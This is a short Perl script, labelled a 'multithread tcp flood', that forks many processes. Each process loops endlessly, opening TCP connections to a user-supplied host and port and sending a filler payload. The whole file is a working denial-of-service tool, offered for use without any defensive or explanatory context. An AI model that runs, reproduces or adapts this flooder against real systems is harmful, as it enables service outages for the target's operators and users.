#!/usr/bin/perl
#multithread tcp flood
#by
#m0nad at email.com
use strict;
use Socket;

my $host	= shift;
my $port	= shift or die "$0 <host> <port> <threads/forks> <size>\n";
my $forks	= shift || 10;
my $size	= shift || int rand 5000; #65507; 

my $ipaddr	= inet_aton ($host);
my $paddr	= sockaddr_in ($port, $ipaddr);
my $msg		= "A" x $size;
my @childs	= ();

#port is open?
  socket (my $SOCK, PF_INET, SOCK_STREAM, getprotobyname ("tcp")) or die "socket: $!";
  die "port is close\n" unless connect ($SOCK, $paddr);
  close $SOCK;


print "Crtl+C to stop\n";
for (my $i = 0; $i < $forks; $i++) {
  my $pid = fork;
  unless ($pid) {
    while (1) {
      socket ($SOCK, PF_INET, SOCK_STREAM, getprotobyname ("tcp")) or die "socket: $!";
      if (connect ($SOCK, $paddr))  {
        send ($SOCK, $msg, 0, $paddr) == length($msg) or die "Error sending to $host:$port\n $!" ;     
      }
      close $SOCK;
    } 
  } else {
    push (@childs, $pid);
  }
}
foreach (@childs) {
  waitpid ($_, 0);
}

